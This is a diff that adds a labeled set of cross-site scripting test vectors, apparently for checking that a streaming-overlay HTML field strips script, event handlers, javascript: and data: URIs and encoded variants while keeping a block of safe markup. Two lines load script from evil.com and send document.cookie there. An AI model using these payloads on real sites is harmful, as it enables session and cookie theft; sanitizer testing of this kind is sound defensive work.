@@ -1,0 +1,74 @@
+<!-- XSS Test Vectors - paste this entire block into an overlay's HTML field -->
+<!-- Each line is labeled. After saving, any that still execute = a problem. -->
+
+<!-- 1. SCRIPT TAGS -->
+<script>alert('1-script-basic')</script>
+<script type="text/javascript">alert('1-script-typed')</script>
+<SCRIPT>alert('1-script-uppercase')</SCRIPT>
+<script src="https://evil.com/payload.js"></script>
+<script>document.location='https://evil.com/?c='+document.cookie</script>
+
+<!-- 2. EVENT HANDLERS -->
+<svg onload=alert('2-svg-onload')>
+<img src=x onerror=alert('2-img-onerror')>
+<body onload=alert('2-body-onload')>
+<div onmouseover=alert('2-div-mouseover')>Hover me</div>
+<input onfocus=alert('2-input-focus') autofocus>
+<marquee onstart=alert('2-marquee-onstart')>
+<video onloadstart=alert('2-video-onloadstart')><source src=x></video>
+<details ontoggle=alert('2-details-ontoggle') open>Toggle</details>
+<select onchange=alert('2-select-onchange')><option>Pick</option></select>
+<textarea onselect=alert('2-textarea-onselect')>Select me</textarea>
+<button onclick=alert('2-button-onclick')>Click me</button>
+<a onmousedown=alert('2-a-mousedown')>Mouse down</a>
+<div onkeyup=alert('2-div-keyup') tabindex="0">Key up</div>
+
+<!-- 3. JAVASCRIPT URIS -->
+<a href="javascript:alert('3-a-href')">JS link</a>
+<a href="JAVASCRIPT:alert('3-a-href-uppercase')">JS link uppercase</a>
+<a href="javascript :alert('3-a-href-space')">JS link with space</a>
+<form action="javascript:alert('3-form-action')"><button>Submit form</button></form>
+<iframe src="javascript:alert('3-iframe-src')"></iframe>
+<object data="javascript:alert('3-object-data')"></object>
+<button formaction="javascript:alert('3-button-formaction')">Formaction</button>
+
+<!-- 4. DATA URIS -->
+<iframe src="data:text/html,<script>alert('4-iframe-data-uri')</script>"></iframe>
+<object data="data:text/html,<script>alert('4-object-data-uri')</script>"></object>
+<a href="data:text/html,<script>alert('4-a-data-uri')</script>">Data link</a>
+
+<!-- 5. META / REFRESH -->
+<meta http-equiv="refresh" content="0;url=javascript:alert('5-meta-refresh')">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('5-meta-data')</script>">
+
+<!-- 6. CSS EXPRESSIONS (IE legacy, mostly dead) -->
+<div style="width: expression(alert('6-css-expression'))">CSS expression</div>
+<div style="background: url('javascript:alert(6)')">CSS background JS</div>
+<div style="behavior: url('xss.htc')">CSS behavior</div>
+
+<!-- 7. EMBEDDED OBJECTS -->
+<embed src="javascript:alert('7-embed')">
+<object type="text/html" data="javascript:alert('7-object-type')"></object>
+<svg><use xlink:href="javascript:alert('7-svg-xlink')"></use></svg>
+
+<!-- 8. MIXED / CHAINED ATTACKS -->
+<div onclick=alert('8-mixed') style="cursor:pointer">Click this div</div>
+<form action="javascript:alert('8-form-chain')"><input type="submit" value="Chain attack"></form>
+<a href="javascript:void(0)" onclick=alert('8-a-both')>Double vector</a>
+<svg><script>alert('8-svg-script')</script></svg>
+
+<!-- 9. ENCODING TRICKS -->
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('9-html-encoded')">HTML entity encoded</a>
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('9-hex-encoded')">Hex entity encoded</a>
+<div id="x" onclick="&#97;lert('9-entity-in-handler')">Entity in handler</div>
+
+<!-- 10. SAFE HTML (should survive sanitization untouched) -->
+<div class="overlay-wrapper" style="padding: 20px; background: rgba(0,0,0,0.8); color: white; border-radius: 8px;">
+  <h1 style="font-size: 24px;">Stream Starting Soon</h1>
+  <p>Follower count: [[[follower_count]]]</p>
+  <p>Latest follower: [[[latest_follower]]]</p>
+  <img src="https://example.com/logo.png" alt="Logo" style="max-width: 100px;">
+  <a href="https://twitch.tv/channel" target="_blank">Visit channel</a>
+  <form action="/submit" method="post"><input type="text"><button>OK</button></form>
+  <span style="color: #ff6b6b;">Timer: [[[c:timer|duration:hh:mm:ss]]]</span>
+</div>
